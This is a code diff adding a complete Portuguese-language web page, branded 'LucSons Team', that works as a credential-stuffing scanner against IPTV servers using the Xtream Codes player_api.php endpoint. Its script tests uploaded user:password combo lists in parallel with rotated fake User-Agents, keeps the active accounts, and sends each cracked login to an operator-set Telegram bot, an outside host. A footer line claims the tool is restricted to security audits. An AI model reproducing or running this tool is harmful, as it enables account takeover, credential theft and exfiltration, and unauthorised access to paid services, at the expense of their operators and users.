+}
+#progressBar {
+  background: #120202;
+  border-radius: 8px;
+  height: 25px;
+  overflow: hidden;
+}
+#progressBarFill {
+  background: linear-gradient(90deg, #5e0000, var(--neon-fire), var(--border-glow));
+  height: 100%;
+  width: 0%;
+  transition: width 0.3s ease;
+  box-shadow: 0 0 10px var(--border-glow);
+}
+#progressText {
+  margin-top: 15px;
+  font-size: 1.05rem;
+  text-align: center;
+  color: var(--text-warm);
+  font-weight: bold;
+}
+
+#hitsCount {
+  margin-top: 30px;
+  font-weight: 900;
+  font-size: 1.6rem;
+  text-align: center;
+  color: #ffffff;
+  text-shadow: 0 0 12px var(--border-glow);
+  background: rgba(28, 5, 5, 0.85);
+  display: inline-block;
+  padding: 8px 30px;
+  border-radius: 8px;
+  border: 1px solid var(--neon-fire);
+}
+
+#hitsContainer {
+  margin-top: 20px;
+  width: 100%;
+  background: rgba(18, 2, 2, 0.9);
+  padding: 25px;
+  border-radius: 16px;
+  border: 1px solid var(--neon-fire);
+  box-shadow: 0 0 25px rgba(255, 60, 0, 0.25);
+  overflow-y: auto;
+  max-height: 550px;
+  display: flex;
+  flex-direction: column;
+  gap: 22px;
+}
+
+.hit-block {
+  border: 2px solid var(--neon-fire);
+  background: #240606;
+  border-radius: 12px;
+  padding: 22px 24px;
+  box-shadow: 0 0 12px rgba(255,60,0,0.35);
+}
+.hit-header {
+  font-weight: 900;
+  font-size: 1.25rem;
+  margin-bottom: 16px;
+  color: #ffffff;
+  border-left: 6px solid var(--border-glow);
+  padding-left: 14px;
+}
+.hit-content {
+  font-family: 'Orbitron', monospace;
+  font-size: 0.9rem;
+  color: var(--text-light);
+  background: #120202;
+  padding: 16px;
+  border-radius: 8px;
+  white-space: pre-wrap;
+  word-break: break-word;
+  line-height: 1.45;
+}
+.copy-btn {
+  margin-top: 18px;
+  padding: 10px 22px;
+  background: #5e0000;
+  border: none;
+  border-radius: 8px;
+  color: #ffffff;
+  cursor: pointer;
+}
+
+.telegram-config {
+  margin-top: 25px;
+  padding: 20px;
+  background: rgba(36, 6, 6, 0.8);
+  border: 2px dashed var(--neon-fire);
+  border-radius: 16px;
+  max-width: 620px;
+}
+.telegram-config h3 {
+  color: var(--neon-fire);
+  margin-bottom: 15px;
+  font-size: 1.2rem;
+}
+
+footer {
+  margin-top: 55px;
+  text-align: center;
+  font-size: 0.85rem;
+  color: var(--text-warm);
+  border-top: 1px solid var(--neon-fire);
+  padding-top: 20px;
+}
+</style>
+</head>
+<body>
+
+<div class="copa-banner">
+  <img src="fundo.jpg" alt="LucSons Team Banner">
+</div>
+
+<div class="main-content">
+  <div id="logoContainer">
+    <svg class="handshake-icon" viewBox="0 0 24 24">
+      <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
+    </svg>
+  </div>
+
+  <h1>LucSons Team</h1>
+
+  <div style="display: flex; flex-wrap: wrap; gap: 30px; justify-content: center;">
+    <div style="flex: 1; min-width: 300px; max-width: 620px;">
+      <label for="hostInput">🏟️ URL DO SERVIDOR (HOST):</label>
+      <input type="text" id="hostInput" placeholder="ex: servidor.com:8080" />
+
+      <label for="comboFile">📂 ARQUIVO DE LISTA (.TXT):</label>
+      <input type="file" id="comboFile" accept=".txt" />
+
+      <label for="concurrencyInput">⚡ VELOCIDADE (THREADS):</label>
+      <input type="number" id="concurrencyInput" value="20" min="1" max="100" />
+
+      <div class="telegram-config">
+        <h3>🤖 CONFIGURAÇÃO DO TELEGRAM</h3>
+        <div class="input-group">
+          <label style="margin-top: 0; font-size: 0.9rem;">TOKEN DO BOT:</label>
+          <input type="text" id="tgToken" placeholder="TOKEN_DO_BOT" style="padding: 10px 15px; font-size: 0.9rem;" />
+        </div>
+        <div class="input-group">
+          <label style="margin-top: 10px; font-size: 0.9rem;">CHAT ID:</label>
+          <input type="text" id="tgChatId" placeholder="CHAT_ID" style="padding: 10px 15px; font-size: 0.9rem;" />
+        </div>
+      </div>
+
+      <div style="margin-top: 10px;">
+        <button id="startBtn" disabled>▶️ INICIAR SCANNER</button>
+        <button id="stopBtn" disabled>⏸️ INTERROMPER</button>
+        <button id="copyBtn" disabled>📋 COPIAR RESULTADOS</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="progressContainer">
+    <div id="progressBar">
+      <div id="progressBarFill"></div>
+    </div>
+    <div id="progressText">Aguardando importação dos arquivos...</div>
+  </div>
+
+  <div style="text-align: center;">
+    <div id="hitsCount">HITS ENCONTRADOS: 0</div>
+  </div>
+
+  <div id="hitsContainer"></div>
+
+  <footer>
+    &copy; 2026 LUCSONS TEAM - SCANNER PROFISSIONAL<br>
+    <span style="font-size: 0.7rem; opacity: 0.5;">Uso restrito para auditorias de segurança e fins informativos.</span>
+  </footer>
+</div>
+
+<script>
+const hostInput = document.getElementById('hostInput');
+const comboFile = document.getElementById('comboFile');
+const concurrencyInput = document.getElementById('concurrencyInput');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const copyBtn = document.getElementById('copyBtn');
+const progressBarFill = document.getElementById('progressBarFill');
+const progressText = document.getElementById('progressText');
+const hitsCountDisplay = document.getElementById('hitsCount');
+const hitsContainer = document.getElementById('hitsContainer');
+const tgTokenInput = document.getElementById('tgToken');
+const tgChatIdInput = document.getElementById('tgChatId');
+
+const userAgents = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+  "Mozilla/5.0 (Android 14; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
+];
+
+function getRandomUserAgent() {
+  return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+let combos = [];
+let hits = [];
+let isRunning = false;
+let stopRequested = false;
+let processedCount = 0;
+let totalCombos = 0;
+
+function atualizarProgresso() {
+  const percent = totalCombos > 0 ? (processedCount / totalCombos) * 100 : 0;
+  progressBarFill.style.width = `${percent}%`;
+  progressText.textContent = `PROCESSADO: ${processedCount} DE ${totalCombos} (${percent.toFixed(1)}%)`;
+  hitsCountDisplay.textContent = `HITS ENCONTRADOS: ${hits.length}`;
+}
+
+function limparHost(url) {
+  return url.replace(/^https?:\/\//, '').replace(/\/$/, '');
+}
+
+async function fetchTimeout(url, options = {}, timeout = 8000) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), timeout);
+  if (!options.headers) options.headers = {};
+  options.headers['User-Agent'] = getRandomUserAgent();
+  try {
+    const response = await fetch(url, { ...options, signal: controller.signal });
+    clearTimeout(id);
+    return response;
+  } catch (e) {
+    clearTimeout(id);
+    throw e;
+  }
+}
+
+function unixToFormattedDate(unix) {
+  if (!unix || unix === "null") return "♾️ Vitalícia";
+  const d = new Date(Number(unix) * 1000);
+  return `${String(d.getDate()).padStart(2, "0")}/${String(d.getMonth() + 1).padStart(2, "0")}/${d.getFullYear()}`;
+}
+
+async function getIpInfo(hostname) {
+  try {
+    const res = await fetchTimeout(`http://ip-api.com/json/${hostname}?fields=query,country,timezone`);
+    if(!res.ok) return { ip: hostname, country: "N/A", timezone: "N/A" };
+    const data = await res.json();
+    return { ip: data.query || hostname, country: data.country || "N/A", timezone: data.timezone || "N/A" };
+  } catch {
+    return { ip: hostname, country: "N/A", timezone: "N/A" };
+  }
+}
+
+async function fetchStreamData(host, user, pass) {
+  const baseUrl = `http://${host}`;
+  const data = { canais: [], filmes: [], series: [], categorias: "" };
+  async function fetchJson(url) {
+    try {
+      const res = await fetchTimeout(url);
+      return res.ok ? await res.json() : [];
+    } catch { return []; }
+  }
+  data.canais = await fetchJson(`${baseUrl}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`);
+  data.filmes = await fetchJson(`${baseUrl}/player_api.php?username=${user}&password=${pass}&action=get_vod_streams`);
+  data.series = await fetchJson(`${baseUrl}/player_api.php?username=${user}&password=${pass}&action=get_series`);
+  return data;
+}
+
+async function enviarTelegram(texto) {
+  const token = tgTokenInput.value.trim();
+  const chatId = tgChatIdInput.value.trim();
+  if (!token || !chatId) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: texto, parse_mode: 'Markdown' })
+    });
+  } catch (e) { console.error(e); }
+}
+
+async function validarCombo(host, combo) {
+  try {
+    if (stopRequested) return null;
+    const [user, pass] = combo.split(':');
+    if (!user || !pass) return null;
+
+    let porta = "80";
+    let hostSemPorta = host;
+    if (host.includes(':')) { [hostSemPorta, porta] = host.split(':'); }
+
+    const resUserInfo = await fetchTimeout(`http://${hostSemPorta}:${porta}/player_api.php?username=${user}&password=${pass}`);
+    if (!resUserInfo.ok) return null;
+
+    const dataUser = await resUserInfo.json();
+    if (!(dataUser.user_info && dataUser.user_info.status && dataUser.user_info.status.toLowerCase() === 'active')) return null;
+
+    const info = dataUser.user_info;
+    const ipInfo = await getIpInfo(hostSemPorta);
+    const streamData = await fetchStreamData(hostSemPorta, user, pass);
+    const expira = unixToFormattedDate(info.exp_date);
+
+    const texto = 
+`🔥 LUCSONS TEAM SCANNER 🔥
+━━━━━━━━━━━━━━━━━━━
+👤 Usuário: ${user}
+🔑 Senha: ${pass}
+⚡ Status: ${info.status.toUpperCase()}
+⏰ Expiração: ${expira}
+━━━━━━━━━━━━━━━━━━━
+🏟️ Host: ${hostSemPorta} | Porta: ${porta}
+📍 País Sede: ${ipInfo.country} | Fuso: ${ipInfo.timezone}
+📺 Canais: ${streamData.canais.length} | 🎬 Filmes: ${streamData.filmes.length} | 🍿 Séries: ${streamData.series.length}
+━━━━━━━━━━━━━━━━━━━
+✨ LucSons Team - Capturado com Sucesso!
+`;
+    const hit = { texto, user, pass, host: hostSemPorta };
+    enviarTelegram(texto);
+    return hit;
+  } catch { return null; }
+}
+
+function mostrarHit(hit) {
+  const div = document.createElement('div');
+  div.className = 'hit-block';
+  const header = document.createElement('div');
+  header.className = 'hit-header';
+  header.textContent = `🔥 ${hit.user} : ${hit.pass}`;
+  div.appendChild(header);
+
+  const content = document.createElement('pre');
+  content.className = 'hit-content';
+  content.textContent = hit.texto;
+  div.appendChild(content);
+
+  const copyButton = document.createElement('button');
+  copyButton.className = 'copy-btn';
+  copyButton.textContent = '📋 COPIAR HIT';
+  copyButton.addEventListener('click', (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(hit.texto).then(() => {
+      copyButton.textContent = '✅ COPIADO!';
+      setTimeout(() => copyButton.textContent = '📋 COPIAR HIT', 1500);
+    });
+  });
+  div.appendChild(copyButton);
+  hitsContainer.prepend(div);
+}
+
+async function processarCombos(host, combos, concorrencia) {
+  hitsContainer.innerHTML = '';
+  hits = [];
+  totalCombos = combos.length;
+  processedCount = 0;
+  isRunning = true;
+  stopRequested = false;
+  atualizarProgresso();
+  let index = 0;
+
+  async function worker() {
+    while (index < totalCombos && !stopRequested) {
+      const i = index++;
+      const combo = combos[i];
+      const hit = await validarCombo(host, combo);
+      processedCount++;
+      if (hit) { hits.push(hit); mostrarHit(hit); }
+      atualizarProgresso();
+    }
+  }
+
+  const workers = [];
+  for (let i = 0; i < concorrencia; i++) workers.push(worker());
+  await Promise.all(workers);
+
+  isRunning = false;
+  progressText.textContent += stopRequested ? ' | ⏸️ PARADO.' : ' | 🔥 FINALIZADO.';
+  copyBtn.disabled = hits.length === 0;
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
+}
+
+function refreshStartButton() {
+  startBtn.disabled = !(hostInput.value.trim().length > 0 && combos.length > 0) || isRunning;
+}
+
+hostInput.addEventListener('input', refreshStartButton);
+comboFile.addEventListener('change', () => {
+  const file = comboFile.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    combos = e.target.result.split(/\r?\n/).map(l => l.trim()).filter(l => l);
+    refreshStartButton();
+  };
+  reader.readAsText(file);
+});
+
+startBtn.addEventListener('click', () => {
+  if (isRunning) return;
+  startBtn.disabled = true;
+  copyBtn.disabled = true;
+  stopBtn.disabled = false;
+  const host = limparHost(hostInput.value);
+  processarCombos(host, combos, parseInt(concurrencyInput.value) || 20);
+});
+
+stopBtn.addEventListener('click', () => {
+  if(!isRunning) return;
+  stopRequested = true;
+  stopBtn.disabled = true;
+});
+
+copyBtn.addEventListener('click', () => {
+  const texto = hits.map(h => h.texto.trim()).join('\n\n');
+  navigator.clipboard.writeText(texto).then(() => alert('HITS COPIADOS!'));
+});
+</script>
+</body>
 </html>
